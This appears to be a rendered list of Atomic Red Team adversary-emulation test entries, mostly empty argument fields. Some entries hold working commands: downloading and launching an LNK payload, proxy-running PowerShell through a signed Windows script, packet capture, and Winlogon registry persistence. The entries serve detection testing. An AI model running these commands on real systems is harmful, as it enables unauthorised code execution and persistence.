<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: {'description': 'Maldoc application Word or Excel\n', 'type': 'string', 'default': 'Word'}</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 581d7521-9c4b-420e-9695-2aec5241167f</li>
<li><strong>name</strong>: LNK Payload Download</li>
<li><strong>description</strong>: This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
$file1 = "$env:Temp\test10.lnk"
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: $file1 = "$env:Temp\test10.lnk"
$file2 = "$env:Temp\a.exe"
Remove-Item $file1 -ErrorAction Ignore
Remove-Item $file2 -ErrorAction Ignore</li>
<li><strong>mitre_id</strong>: T1204.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 275d963d-3f36-476c-8bef-a2a3960ee6eb</li>
<li><strong>name</strong>: SyncAppvPublishingServer Signed Script PowerShell Command Execution</li>
<li>
<p><strong>description</strong>: Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
Upon execution, calc.exe will be launched.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1216</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: {'description': 'A PowerShell command to execute.', 'type': 'string', 'default': 'Start-Process calc'}</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9c15a7de-de14-46c3-bc2a-6d94130986ae</li>
<li><strong>name</strong>: PowerShell Network Sniffing</li>
<li><strong>description</strong>: PowerShell Built-in Cmdlets to capture network traffic.
https://learn.microsoft.com/en-us/powershell/module/neteventpacketcapture/new-neteventsession?view=windowsserver2022-ps</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: New-NetEventSession -Name Capture007 -LocalFilePath "$ENV:Temp\sniff.etl"
Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100
Start-NetEventSession -Name Capture007
Stop-NetEventSession -Name Capture007
Remove-NetEventSession -Name Capture007</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: del $ENV:Temp\sniff.etl</li>
<li><strong>mitre_id</strong>: T1040</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: bf9f9d65-ee4d-4c3e-a843-777d04f19c38</li>
<li><strong>name</strong>: Winlogon Shell Key Persistence - PowerShell</li>
<li><strong>description</strong>: PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.</li>
</ul>
<p>Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: fb32c935-ee2e-454b-8fa3-1c46b42e8dfb</li>
<li><strong>name</strong>: Winlogon Userinit Key Persistence - PowerShell</li>
<li><strong>description</strong>: PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.</li>
</ul>
<p>Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d40da266-e073-4e5a-bb8b-2b385023e5f9</li>
<li><strong>name</strong>: Winlogon Notify Key Logon Persistence - PowerShell</li>
<li><strong>description</strong>: PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.</li>
</ul>
<p>Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.</p>
<p>Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "#{binary_to_execute}" -Type ExpandString -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "#{function_to_execute}" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 95a3c42f-8c88-4952-ad60-13b81d929a9d</li>
<li><strong>name</strong>: Winlogon HKLM Shell Key Persistence - PowerShell</li>
<li><strong>description</strong>: PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.</li>
</ul>
<p>Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
